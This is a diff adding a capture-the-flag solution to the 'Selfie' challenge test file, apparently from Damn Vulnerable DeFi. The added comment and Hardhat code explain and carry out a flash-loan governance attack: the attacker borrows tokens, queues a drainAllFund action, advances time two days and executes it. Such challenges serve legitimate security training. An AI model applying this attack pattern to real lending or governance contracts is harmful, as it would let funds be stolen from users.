@@ -31,6 +31,18 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        /** WHAT'S WRONG?
+         * @notice the one wrong in this contract is the contract itself
+         * the governance contract need an address to have half of the total supply to queue an action
+         * simply that address can loan from SelfiePool then queue an action
+         * yes that capable to queue drainAllFund from SelfiePool! 
+         * so attacker should loan from SelfiePool and queue drainAllFund, after 2 days attacker can execute the action!
+         */
+        const AttackFactory = await ethers.getContractFactory("SelfieAttack",attacker);
+        this.attackContract = await AttackFactory.deploy(this.governance.address, this.pool.address,this.token.address);
+        await this.attackContract.connect(attacker).attack(attacker.address);
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60])
+        await this.governance.connect(attacker).executeAction(await this.attackContract.actionId());
     });
 
     after(async function () {
